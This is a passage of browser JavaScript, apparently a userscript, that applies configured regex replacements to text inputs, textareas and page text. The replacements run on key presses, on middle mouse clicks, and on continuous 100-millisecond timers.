            for (const { regex, replace } of preparedReplacements) {
                if (regex.test(replaced)) {
                    replaced = replaced.replace(regex, replace);
                    changed = true;
                }
            }

            if (changed && replaced !== val) {
                input.value = replaced;
                input.dispatchEvent(new Event("input", { bubbles: true }));
                input.dispatchEvent(new Event("change", { bubbles: true }));
            }
        }
    }

    // === Automatic replacement for inactive inputs (continuous) ===
    function replaceInputValuesAuto() {
        if (!autoOnBlur) return;
        const inputs = document.querySelectorAll("input[type='text'], textarea");
        for (const input of inputs) {
            if (document.activeElement === input) continue; // skip active input

            const val = input.value;
            if (!val) continue;

            preparedReplacements.forEach(({ regex, replace, autoDelay }) => {
                if (regex.test(val)) {
                    setTimeout(() => {
                        const currentVal = input.value;
                        input.value = currentVal.replace(regex, replace);
                        input.dispatchEvent(new Event("input", { bubbles: true }));
                        input.dispatchEvent(new Event("change", { bubbles: true }));
                    }, autoDelay);
                }
            });
        }
    }

    // === Trigger configuration ===
    const availableTriggers = {
        keyR: { type: "key", code: "r" },
        keyTab: { type: "key", code: "Tab", delay: 200 },
        keyMonth: { type: "key", code: "m" },
        mouseMiddle: { type: "mouse", button: 1 }
    };
    const activeTriggers = ["keyR", "keyTab", "mouseMiddle"];

    // === Manual trigger listeners ===
    document.addEventListener("keydown", e => {
        for (const triggerName of activeTriggers) {
            const trigger = availableTriggers[triggerName];
            if (trigger.type === "key" && e.key === trigger.code) {
                if (trigger.delay) {
                    setTimeout(replaceInputValuesManual, trigger.delay);
                } else {
                    replaceInputValuesManual();
                }
            }
        }
    });

    document.addEventListener("mousedown", e => {
        for (const triggerName of activeTriggers) {
            const trigger = availableTriggers[triggerName];
            if (trigger.type === "mouse" && e.button === trigger.button) {
                replaceInputValuesManual();
            }
        }
    });

    // === Continuous automatic replacement for inactive inputs ===
    if (autoOnBlur) {
        setInterval(replaceInputValuesAuto, 100); // runs continuously
    }

    // Optional: continuously replace text nodes
    setInterval(replaceTextNodes, 100);
}


